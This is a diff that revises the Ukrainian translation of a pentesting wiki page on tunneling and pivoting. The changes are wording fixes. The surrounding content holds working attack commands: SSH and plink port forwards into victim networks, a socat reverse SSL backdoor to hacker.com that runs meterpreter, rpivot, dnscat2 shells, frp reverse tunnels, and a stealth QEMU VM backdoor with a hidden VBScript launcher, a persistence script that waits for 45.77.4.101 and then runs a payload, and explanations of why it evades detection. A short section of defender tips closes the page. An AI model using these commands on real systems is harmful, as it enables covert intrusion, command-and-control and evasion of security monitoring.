@@ -55,7 +55,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Зворотне Портове Перенаправлення
+### Зворотне перенаправлення портів
 
 Це корисно для отримання зворотних шелів з внутрішніх хостів через DMZ до вашого хоста:
 ```bash
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Безпека – Атака Terrapin (CVE-2023-48795)**
-> Атака з пониженням Terrapin 2023 року може дозволити зловмиснику в середньому положенні підробити ранній SSH handshake і впровадити дані в **будь-який перенаправлений канал** ( `-L`, `-R`, `-D` ). Переконайтеся, що як клієнт, так і сервер оновлені ( **OpenSSH ≥ 9.6/LibreSSH 6.7** ) або явно вимкніть вразливі алгоритми `chacha20-poly1305@openssh.com` та `*-etm@openssh.com` у `sshd_config`/`ssh_config` перед тим, як покладатися на SSH тунелі.
+> Атака з пониженням Terrapin 2023 року може дозволити зловмиснику в середньому положенні втручатися в ранній SSH-рукопожаття та впроваджувати дані в **будь-який перенаправлений канал** ( `-L`, `-R`, `-D` ). Переконайтеся, що як клієнт, так і сервер оновлені (**OpenSSH ≥ 9.6/LibreSSH 6.7**) або явно вимкніть вразливі алгоритми `chacha20-poly1305@openssh.com` та `*-etm@openssh.com` у `sshd_config`/`ssh_config` перед тим, як покладатися на SSH-тунелі.
 
 ## SSHUTTLE
 
@@ -149,18 +149,18 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> У цьому випадку **порт відкритий на хості-мітці**, а не на сервері команди, і трафік надсилається на сервер команди, а звідти на вказаний хост:порт
+> У цьому випадку **порт відкритий на хості маяка**, а не на сервері команди, і трафік надсилається на сервер команди, а звідти на вказаний хост:порт
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-Зверніть увагу:
+Щоб звернути увагу:
 
-- Зворотний портовий переказ Beacon призначений для **тунелювання трафіку до Team Server, а не для пересилання між окремими машинами**.
+- Зворотний портовий переадресація Beacon призначена для **тунелювання трафіку до Team Server, а не для пересилання між окремими машинами**.
 - Трафік **тунелюється в межах C2 трафіку Beacon**, включаючи P2P посилання.
-- **Привілеї адміністратора не потрібні** для створення зворотних портових переказів на високих портах.
+- **Привілеї адміністратора не потрібні** для створення зворотних портових переадресацій на високих портах.
 
-### rPort2Port локально
+### rPort2Port локальний
 
 > [!WARNING]
 > У цьому випадку **порт відкривається на хості beacon**, а не на Team Server, і **трафік надсилається до клієнта Cobalt Strike** (не до Team Server) і звідти до вказаного хосту:порту.
@@ -241,7 +241,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
-Зворотний тунель. Тунель починається від жертви.\
+Зворотний тунель. Тунель запускається з жертви.\
 Створюється socks4 проксі на 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
@@ -290,13 +290,15 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Ви можете обійти **неавторизований проксі**, виконавши цю команду замість останньої в консолі жертви:
+Ви можете обійти **неавторизований проксі**, виконавши цей рядок замість останнього в консолі жертви:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+
 ### SSL Socat Tunnel
 
-**/bin/sh console**
+**/bin/sh консоль**
 
 Створіть сертифікати з обох сторін: Клієнт і Сервер
 ```bash
@@ -324,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Це як консольна версія PuTTY (опції дуже схожі на клієнт ssh).
 
-Оскільки цей бінар буде виконуватись на жертві і є клієнтом ssh, нам потрібно відкрити наш ssh-сервіс і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
+Оскільки цей бінар буде виконуватись на жертві і є клієнтом ssh, нам потрібно відкрити наш сервіс ssh і порт, щоб ми могли отримати зворотне з'єднання. Потім, щоб перенаправити лише локально доступний порт на порт у нашій машині:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -348,7 +350,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Вам потрібно мати **доступ до RDP через систему**.\
 Завантажте:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service Windows. DVC відповідає за **тунелювання пакетів через RDP з'єднання**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service Windows. DVC відповідає за **тунелювання пакетів через RDP-з'єднання**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 На вашому клієнтському комп'ютері завантажте **`SocksOverRDP-Plugin.dll`** ось так:
@@ -371,10 +373,10 @@ netstat -antb | findstr 1080
 ## Проксування Windows GUI додатків
 
 Ви можете налаштувати Windows GUI додатки для роботи через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
-У **Профіль -> Проксі-сервери** додайте IP-адресу та порт SOCKS-сервера.\
-У **Профіль -> Правила проксування** додайте назву програми, яку потрібно проксувати, та з'єднання з IP-адресами, які ви хочете проксувати.
+У **Profile -> Proxy Servers** додайте IP-адресу та порт SOCKS сервера.\
+У **Profile -> Proxification Rules** додайте назву програми для проксування та з'єднання з IP-адресами, які ви хочете проксувати.
 
-## Обхід проксі NTLM
+## Обхід NTLM проксі
 
 Раніше згадуваний інструмент: **Rpivot**\
 **OpenVPN** також може обійти це, встановивши ці параметри у файлі конфігурації:
@@ -385,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Він аутентифікується проти проксі-сервера та прив'язує порт локально, який перенаправляється на зовнішній сервіс, який ви вказуєте. Потім ви можете використовувати інструмент на ваш вибір через цей порт.\
+Він аутентифікується проти проксі і прив'язує порт локально, який перенаправляється на зовнішній сервіс, який ви вказуєте. Потім ви можете використовувати інструмент на ваш вибір через цей порт.\
 Наприклад, перенаправити порт 443
 ```
 Username Alice
@@ -432,7 +434,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **У PowerShell**
 
-Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) для запуску клієнта dnscat2 у PowerShell:
+Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) для запуску клієнта dnscat2 у powershell:
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
@@ -444,7 +446,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Зміна DNS у proxychains
 
-Proxychains перехоплює виклик `gethostbyname` libc і тунелює tcp DNS запит через socks проксі. За **замовчуванням** DNS сервер, який використовує proxychains, є **4.2.2.2** (жорстко закодований). Щоб змінити його, відредагуйте файл: _/usr/lib/proxychains3/proxyresolv_ і змініть IP. Якщо ви в **середовищі Windows**, ви можете встановити IP **контролера домену**.
+Proxychains перехоплює виклик `gethostbyname` libc і тунелює tcp DNS запит через socks проксі. За **замовчуванням** DNS сервер, який використовує proxychains, це **4.2.2.2** (жорстко закодований). Щоб змінити його, відредагуйте файл: _/usr/lib/proxychains3/proxyresolv_ і змініть IP. Якщо ви в **середовищі Windows**, ви можете встановити IP **контролера домену**.
 
 ## Тунелі в Go
 
@@ -457,7 +459,7 @@ Proxychains перехоплює виклик `gethostbyname` libc і тунел
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Для створення tun адаптерів і тунелювання даних між ними за допомогою ICMP echo запитів потрібен root доступ в обох системах.
+Root потрібен в обох системах для створення tun адаптерів і тунелювання даних між ними за допомогою ICMP echo запитів.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -576,7 +578,7 @@ cloudflared tunnel run mytunnel
 
 ## FRP (Швидкий зворотний проксі)
 
-[`frp`](https://github.com/fatedier/frp) є активно підтримуваним зворотним проксі на Go, який підтримує **TCP, UDP, HTTP/S, SOCKS та P2P NAT-пробивання**. Починаючи з **v0.53.0 (травень 2024)**, він може діяти як **SSH Tunnel Gateway**, тому цільовий хост може створити зворотний тунель, використовуючи лише стандартний клієнт OpenSSH – без додаткового бінарного файлу.
+[`frp`](https://github.com/fatedier/frp) є активно підтримуваним зворотним проксі на Go, який підтримує **TCP, UDP, HTTP/S, SOCKS та P2P NAT-hole-punching**. Починаючи з **v0.53.0 (травень 2024)**, він може діяти як **SSH Tunnel Gateway**, тому цільовий хост може створити зворотний тунель, використовуючи лише стандартний клієнт OpenSSH – без додаткового бінарного файлу.
 
 ### Класичний зворотний TCP тунель
 ```bash
@@ -597,7 +599,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### Використання нового SSH шлюзу (без бінарного frpc)
+### Використання нового SSH шлюзу (без frpc бінарного файлу)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
@@ -606,7 +608,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Вищезазначена команда публікує порт жертви **8080** як **attacker_ip:9000** без розгортання будь-яких додаткових інструментів – ідеально для pivoting, що використовує ресурси.
+Вищезазначена команда публікує порт жертви **8080** як **attacker_ip:9000** без розгортання будь-яких додаткових інструментів – ідеально для pivoting, що використовує ресурси на місці.
 
 ## Секретні тунелі на базі VM з QEMU
 
@@ -624,7 +626,7 @@ qemu-system-x86_64.exe ^
 ```
 • Команда вище запускає образ **Tiny Core Linux** (`tc.qcow2`) в оперативній пам'яті.  
 • Порт **2222/tcp** на хості Windows прозоро перенаправляється на **22/tcp** всередині гостьової системи.  
-• З точки зору атакуючого, ціль просто відкриває порт 2222; будь-які пакети, які досягають його, обробляються сервером SSH, що працює у віртуальній машині.  
+• З точки зору атакуючого, ціль просто відкриває порт 2222; будь-які пакети, які досягають його, обробляються SSH-сервером, що працює у віртуальній машині.  
 
 ### Запуск непомітно через VBScript
 ```vb
@@ -634,7 +636,7 @@ o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tc
 ```
 Запуск скрипта з `cscript.exe //B update.vbs` тримає вікно прихованим.
 
-### Угостева стійкість
+### Утримання в гості
 
 Оскільки Tiny Core не має стану, зловмисники зазвичай:
 
@@ -646,17 +648,17 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 /opt/123.out
 ```
 
-3. Додають `home/tc` та `opt` до `/opt/filetool.lst`, щоб payload був упакований у `mydata.tgz` під час вимкнення.
+3. Додають `home/tc` та `opt` до `/opt/filetool.lst`, щоб payload був упакований у `mydata.tgz` під час завершення роботи.
 
 ### Чому це уникає виявлення
 
 • Лише два непідписаних виконуваних файли (`qemu-system-*.exe`) торкаються диска; драйвери або служби не встановлюються.
-• Продукти безпеки на хості бачать **безневинний зворотний трафік** (фактичний C2 завершується всередині VM).
-• Сканери пам'яті ніколи не аналізують простір зловмисного процесу, оскільки він живе в іншій ОС.
+• Продукти безпеки на хості бачать **безпечний зворотний трафік** (фактичний C2 завершується всередині VM).
+• Сканери пам'яті ніколи не аналізують простір процесу зловмисника, оскільки він живе в іншій ОС.
 
 ### Поради для захисників
 
-• Сповіщати про **неочікувані бінарні файли QEMU/VirtualBox/KVM** в шляхах, доступних для запису користувачем.
+• Сповіщати про **неочікувані бінарні файли QEMU/VirtualBox/KVM** у шляхах, доступних для запису користувачем.
 • Блокувати вихідні з'єднання, які походять від `qemu-system*.exe`.
 • Шукати рідкісні порти прослуховування (2222, 10022, …), які прив'язуються відразу після запуску QEMU.
 
